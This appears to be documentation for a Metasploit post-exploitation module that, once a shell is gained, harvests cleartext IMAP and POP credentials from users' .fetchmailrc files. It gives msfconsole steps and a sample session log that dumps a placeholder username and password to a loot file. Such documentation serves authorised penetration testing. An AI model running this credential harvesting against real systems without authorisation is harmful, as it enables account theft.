## Vulnerable Application

Post module to obtain credentials saved for IMAP, POP and other mail
retrieval protocols in fetchmail's `.fetchmailrc`.

This file is kept in user's home directories to configure fetchmail,
but contains cleartext credentials.

### Example fetchmailrc file

Example documentation can be found in the fetchmail handbook:
https://docs.freebsd.org/doc/6.0-RELEASE/usr/share/doc/handbook/mail-fetchmail.html#:~:text=fetchmailrc%20serves%20as%20an%20example,user%20on%20the%20local%20system.

```
echo "poll example.com protocol pop3 username \"joesoap\" password \"XXX\"" > ~/.fetchmailrc
```

## Verification Steps

1. Start msfconsole
1. Get a shell on a system
1. Do: `use post/multi/gather/fetchmailrc_creds`
1. Do: `set session [session]`
1. Do: `run`
1. If any `.fetchmailrc` files exist with credentials, they will be read and stored into a loot file.

## Options

## Scenarios

### Ubuntu 22.04.01

```
msf6 auxiliary(scanner/ssh/ssh_login) > sessions -l

Active sessions
===============

  Id  Name  Type         Information   Connection
  --  ----  ----         -----------   ----------
  1         shell linux  SSH ubuntu @  2.2.2.2:39857 -> 1.1.1.1:22 (1.1.1.1)

msf6 auxiliary(scanner/ssh/ssh_login) > use post/multi/gather/fetchmailrc_creds
msf6 post(multi/gather/fetchmailrc_creds) > set session 1
session => 1
msf6 post(multi/gather/fetchmailrc_creds) > run

[*] Parsing /home/ubuntu/.fetchmailrc
                
.fetchmailrc credentials
========================

 Username  Password  Server       Protocol  Port
 --------  --------  ------       --------  ----
 joesoap   XXX       example.com  pop3

[*] Credentials stored in: /root/.msf4/loot/20221008102916_default_1.1.1.1_fetchmailrc.cred_476989.txt
[*] Post module execution completed
```
